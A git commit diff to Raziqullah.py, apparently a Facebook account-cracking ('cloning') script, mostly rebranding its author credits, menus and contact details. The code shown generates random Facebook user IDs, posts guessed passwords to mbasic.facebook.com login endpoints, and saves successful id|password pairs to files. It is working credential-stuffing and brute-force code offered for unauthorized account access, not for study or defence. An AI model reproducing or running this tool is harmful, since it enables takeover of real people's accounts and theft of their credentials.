a16dfbd3543237f2f0663bf3f11fab84c2620268
Saadat-R <131317526+Saadat-R@users.noreply.github.com>
2023-04-25 22:39:59 +0430

    Update Raziqullah.py

--- Raziqullah.py
+++ Raziqullah.py
@@ -1,6 +1,6 @@
-#SCRIPT BY TH3_L3G3ND
-#FB ID Afghan Hacher
-#FACEBOOK.COM/Afgha Hacker
+#SCRIPT BY Raziqullah Saadat
+#FB ID Raziqullah Saadat
+#FACEBOOK.COM/Raziqullah Saadat
 
 W = '\033[97;1m'
 R = '\033[91;1m'
@@ -219,7 +219,7 @@ def setting():
 	passmenu()
 def passmenu():
 	clear()
-	print(logo);print  ('\n [01] First Afghano digit pass \n [02] All Afghanistan Password \n [03] All Country+ password')
+	print(logo);print  ('\n [01] First Saadat digit pass \n [02] All Afg Password \n [03] All Country+ password')
 	passmen=input('\n [#] Select Pass : ')
 	if passmen in ['1','01']:
 		first()
@@ -362,7 +362,7 @@ def free(idf,pwv):
 			pw = pw.lower()
 			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
-			dataa ={"lsd":re.search('Afghano="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('Afghano="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://mbasic.facebook.com/login/save-device/'"}
+			dataa ={"lsd":re.search('Saadat="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('Afghano="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://mbasic.facebook.com/login/save-device/'"}
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
@@ -403,14 +403,14 @@ z \033[1;32m .##....##..##....##.##.....##
 z \033[1;97m .##.....##..######..##.....##
 z \033[1;37m....................................................... z
 z \033[1;37m....................................................... z
- \033[1;97m•••••••••••••••••••••••••••••••••••••••••••••• 
-\x1b[1;93m[+] AUYHOR      : Saadat     
+ \033[1;97m.......................................................
+\x1b[1;93m[+] AUTHOR        : Raziqullah Saadat     
 \x1b[1;91m[+] FACEBOOK    : Raziqullah Saadat
-\x1b[1;92m[+] GIYHUB      : https://github.com/Saadat-R
-\x1b[1;98m[+] Whatsapp    : 0797423006
-\x1b[1;93m[+] TEAM        : \33[1;42  Saadat 02\33[0m
-\x1b[1;94m[+] VERSION     :\x1b[1;97m 3.0.6    \x1b[1;97m          
-\033[1;80m•••••••••••••••••••••••••••••••••••••••••••••• 
+\x1b[1;92m[+] GITHUB         : https://github.com/Saadat-R
+\x1b[1;98m[+] Whatsapp     : +93702856593
+\x1b[1;93m[+] TEAM            : \33[1;42  Saadat 04\33[0m
+\x1b[1;94m[+] VERSION      :\x1b[1;97m 3.0.6    \x1b[1;97m          
+\033[1;80m.......................................................
 """
  
 class Main:
@@ -428,7 +428,7 @@ class Main:
 		
 		
 		print("")
-		print("\033[1;93m [1] SMBCRIBE MY CHANNAL FOR APPROVAL ")
+		print("\033[1;93m [1] SMBCRIBE MY CHANNAL FOR APPROVAL  ")
 		print("\033[1;37m [2] EXIT")
 		print("")
 		Baloch = input("\n\033[1;37m  Choose : \033[1;32m")
@@ -443,20 +443,21 @@ class Main:
 			time.sleep(2.0)
 			print("\033[1;94m    CHECKING APPROVAL ")
 			print("")
-			input("\n\033[1;91m TYPE MY YOUTUBE CHANNAL NAME \033[1;32mSaadat\033[0m \033[1;37m")
+			input("\n\033[1;91m TYPE THE YOUTUBE NAME \033[1;32mSaadat\033[0m \033[1;37m")
 			time.sleep(3.1)
 			print("")
-			print("\033[1;92m WELCOME")
+			print("\033[1;92m WELCOME TO Saadat Tolls")
 			time.sleep(1.0)
 			os.system("clear")
 		print(logo)
 		print("")
-		print ("\033[1;36m         WELCOM")
+		print ("\033[1;36m         WELCOME TO Saadat Tolls")
 		print("\033[1;37m- - - - - - - - - - - - - - - - - - - - - - - - - - -")
 		print(" \033[1;94m[1] File Cloning ")
-		print(" \33[1;32m[2] AFG Random Cloning")
-		print(" \033[1;94m[3] 2004 To 2010 ")
-		print(" \33[1;94m[4] 2010 To 2015 ")
+		print(" \033[1;32m[2] Public Cloning")
+		print(" \33[1;32m[3] AFG Random Cloning")
+		print(" \033[1;94m[4] 2004 To 2010 ")
+		print(" \33[1;94m[5] 2010 To 2015 ")
 		print("\033[1;32m [E] Exit \n")
 		UZAIR =input(" \033[1;91mCHOOSE : ")
 		if UZAIR in ["1", "01"]:
@@ -480,7 +481,7 @@ class Main:
 		xx = 999999999
 		idx = "100000" 
 		os.system('clear');print(logo)
-		limit = int(input(" \n\033[0;95m[+]\033[1;32m TOTAL IDS TO CRACK LIMIT ,2000,5000,10000,50,000... "))
+		limit = int(input(" \n\033[0;95m[+]\033[1;32m TOTAL IDS TO CRACK LIMIT 1000,2000,5000,10000,50,000... "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -492,14 +493,13 @@ class Main:
 				print("\n\033[1;32m [!] Ex(123456-1234567-123456789) FOR Old IDZ\033[1;37m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
-					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
+					exit("\n%s [!] PASSWORD MINIMUM 6-10 CHARACTERS"%(B))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
 				print("     \033[0;93m   Premium Mode  Activated")
 				print("\n\033[0;94m [+] BRUTE HAS BEEN STARTED")
-				print(" \033[0;96m[+] Note : 75% CP Account'S Open Just Now")
-				print(" [!] IF NO RESULT USE AIRPLANE MODE ON & OFF 5 SECONDS")
+				print(" [!] IF NO RESULT USE AIRPLANE MODE FOR 5 SECONDS")
 				print("\033[0;94m------------------------------------------------")
 				print("\n")
 				print("\033[1;37m")
@@ -513,7 +513,7 @@ class Main:
 		"Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefoxversion;]"
 		])
 		sys.stdout.write(
-			"\r [Saadat]%s> /[CRACK]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [Start]%s> /[CRACK]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -536,7 +536,7 @@ class Main:
 				open("SM-OK","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[Afghano OK] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[Saadat OK] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("SM-OK","a").write(" %s | %s\n"%(uid, pw))
 				break
@@ -550,7 +550,7 @@ class Main:
 		xx = 9999999999
 		idx = "10000" 
 		os.system('clear');print(logo)
-		limit = int(input("\n \033[0;95m[+]\033[1;32m TOTAL IDS TO CRACK LIMIT ,2000,5000,10000,50,000... "))
+		limit = int(input("\n \033[0;95m[+]\033[1;32m TOTAL IDS TO CRACK LIMIT 1000,2000,5000,10000,50,000..."))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -562,14 +562,13 @@ class Main:
 				print("\n\033[1;93m [!] Ex(123456-1234567-123456789) FOR Old IDZ\033[1;37m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
-					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
+					exit("\n%s [!] PASSWORD MINIMUM 6-10 CHARACTERS"%(B))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
 				print("     \033[0;93m   Premium Mode  Activated")
 				print("\n\033[0;94m [+] BRUTE HAS BEEN STARTED")
-				print(" \033[0;96m[+] Note : 75% CP Account'S Open Just Now")
-				print(" [!] IF NO RESULT USE AIRPLANE MODE ON & OFF 5 SECONDS")
+				print(" [!] IF NO RESULT USE AIRPLANE MODE FOR 5 SECONDS")
 				print("\033[0;94m------------------------------------------------")
 				print("\n")
 				print("\033[1;37m")
@@ -944,7 +943,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 	])
 		sys.stdout.write(
-			"\r [Saadat]>%s/[CRACK]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [Start]>%s/[CRACK]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -964,7 +963,7 @@ class Main:
 				print("\r \033[1;32m[Saadat OK] %s | %s\033[0;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("Saadat-OK","a").write(" %s|%s\n"%(uid, pw))
+				open("SM-OK","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[1;32m[Saadat OK] %s | %s\033[1;32m         "%(uid, pw))
